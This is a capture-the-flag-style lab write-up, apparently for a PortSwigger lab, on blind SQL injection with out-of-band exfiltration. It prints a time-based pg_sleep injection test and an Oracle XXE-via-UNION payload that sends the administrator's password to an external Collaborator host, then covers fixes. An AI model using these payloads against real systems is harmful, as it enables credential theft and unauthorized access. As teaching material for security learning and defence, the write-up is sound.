# Blind SQL Injection with Out-of-Band Data Exfiltration

**Lab:** Blind SQL injection with out-of-band data exfiltration
**Status:** Solved ✅

---

## What's different about this one

This is the last stop in the blind SQLi series, and it's the trickiest one because the usual tricks don't apply anymore. There's no visible content difference to grep for, and unlike the time-delay lab, the query here runs **asynchronously** — meaning the app doesn't wait around for it to finish, so `pg_sleep()`-style timing tricks won't show up in the response at all.

The way around it: instead of trying to get data back through the HTTP response, we make the *database itself* reach out to a server we control. That's what "out-of-band" means here — the leak happens over a completely separate channel (DNS or HTTP), not through the page we're looking at.

**Goal:** trigger the database into leaking the administrator's password through a DNS/HTTP callback to Burp Collaborator, then log in.

## A quick word on OOB SQLi

Out-of-band injection is what you reach for when blind techniques based on content or timing aren't practical or don't work — but the database happens to have some ability to make outbound network calls (DNS lookups, HTTP requests, that kind of thing). Instead of inferring data indirectly, you get the database to encode the data directly into a hostname or URL and send it off to infrastructure you're watching. It's a powerful technique because it sidesteps response filtering and timing-based defenses entirely — the data never has to touch the app's actual response.

This lab specifically requires **Burp Suite Professional**, since Burp Collaborator (the tool that catches these callbacks) isn't available in the free Community edition.

## Working through it

**1. Grab the request**

Browse to the shop's front page, catch the request in Burp, and find the `TrackingId` cookie — same injection point as the other labs in this series.

**2. Confirm you've got an injection point**

Before jumping straight to the OOB payload, it's worth sanity-checking that the cookie is actually injectable. A quick time-based test works fine for this:

```
x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

If that delays the response by ~10 seconds, you've confirmed injection is possible here — even though the real query we care about later won't behave this way, since it executes asynchronously and won't delay anything.

**3. Set up Burp Collaborator**

Open the **Collaborator** tab in Burp. This gives you a unique, disposable subdomain that Burp is silently listening on for any DNS lookups or HTTP requests that hit it. That's the "external server we control" the whole attack depends on.

**4. Build the payload**

This is the core of the lab, and it's a genuinely clever combination of two separate techniques stacked on top of each other:

- A **UNION-based SQL injection** to get our own query riding along with the app's
- A classic **XXE (XML external entity)** trick, which is normally a completely different vulnerability class, repurposed here purely as a mechanism to force an out-of-band DNS/HTTP lookup

The payload uses Oracle's `EXTRACTVALUE()` function combined with `xmltype()` to parse a crafted XML document. That document declares an external entity pointing at a URL built from the administrator's password concatenated with your Collaborator subdomain. When the database tries to resolve that external entity, it has no choice but to reach out over the network — straight to Collaborator, with the password baked into the hostname.

```
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

Don't type the Collaborator subdomain in by hand — Burp handles that part for you in the next step.

**5. Insert the Collaborator payload**

With that value in the `TrackingId` cookie field in Repeater, right-click right where `BURP-COLLABORATOR-SUBDOMAIN` sits and choose **Insert Collaborator payload**. Burp swaps that placeholder for a live, unique subdomain it's actively monitoring, so any DNS/HTTP traffic that comes back to it gets tied to this specific request.

**6. Send it**

Fire the request off. Remember — the query runs asynchronously, so the HTTP response you get back will look completely normal. That's expected. The real action is happening server-side, out of view, after the response has already come back.

**7. Poll Collaborator for interactions**

Switch to the Collaborator tab and click **Poll now**. Since the query executes asynchronously, the callback might not show up instantly — if nothing's there yet, wait a few seconds and poll again.

**8. Read the password out of the interaction**

Once an interaction shows up, you'll see it logged as a DNS and/or HTTP hit. The password is sitting right there in the subdomain that got looked up:

- For a **DNS interaction**, the full domain name that was resolved is shown in the Description tab.
- For an **HTTP interaction**, it's in the `Host` header, visible under the Request to Collaborator tab.

Either way, the chunk of the hostname just before your Collaborator subdomain is the administrator's password, pulled straight out of the database without ever touching the app's actual HTTP response.

**9. Log in**

Head to **My account**, and log in as `administrator` using the password you just extracted.

## Payload reference

| Purpose | Payload |
|---|---|
| Sanity-check the injection point | `x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--` |
| OOB exfiltration (XXE via UNION) | `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--` |

## Why this works

The application never gives us a content difference or a timing difference to work with — the query is asynchronous, so by the time it even executes, the HTTP response has already been sent and closed. Normally that would be a dead end for blind SQLi.

What saves it is that the database engine itself is capable of making outbound network calls as a side effect of parsing certain data types — in this case, resolving an external XML entity. That's not really a SQL injection primitive on its own; it's an XXE primitive, borrowed and dropped inside a UNION-injected query. The database doesn't know or care that it's being used to exfiltrate data — it's just doing what `EXTRACTVALUE()` and external entity resolution normally do. We just made sure the "external" part of that resolution pointed somewhere we're watching, with the password stitched into the URL it goes to fetch.

## Tools used

- Burp Suite **Professional** (Collaborator requires Pro — Community edition won't work for this lab)
- Burp Repeater
- Browser

## Takeaways

- Out-of-band techniques are the fallback when both content-based and time-based blind SQLi hit a wall — here, an asynchronous query kills timing-based detection entirely.
- OOB SQLi often isn't a "pure" SQL trick — this lab leans on XXE (a totally different vulnerability class) purely as the delivery mechanism for a DNS/HTTP callback.
- Burp Collaborator is the tool that makes OOB attacks practical to actually observe — without a controlled external listener, there'd be no way to see the leaked data at all.
- Data doesn't have to come back through the HTTP response to be exfiltrated. A hostname lookup is just as good a channel as a page body, if you're watching for it.
- The database doesn't need synchronous execution or verbose errors to leak data — if it can reach the network at all, that's a viable exfiltration path.

## Fixing it

Same root cause as every lab in this series — untrusted input flowing into a SQL query — so the same fix applies: use **parameterized queries / prepared statements**, full stop. On top of that, for this specific class of attack:

- Disable or tightly restrict the database's ability to resolve external entities or make arbitrary outbound network calls where it's not genuinely needed.
- Apply least-privilege to database accounts — a compromised query shouldn't have unrestricted network access.
- Don't rely on hiding errors or suppressing timing side-channels as your primary defense; OOB techniques don't need either of those to work.
- Keep egress filtering on database servers tight, so even if injection occurs, the database can't freely phone home to attacker infrastructure.

---

*Solved as part of the PortSwigger Web Security Academy — for learning/authorized testing only. Don't run this against anything you don't have permission to test.*
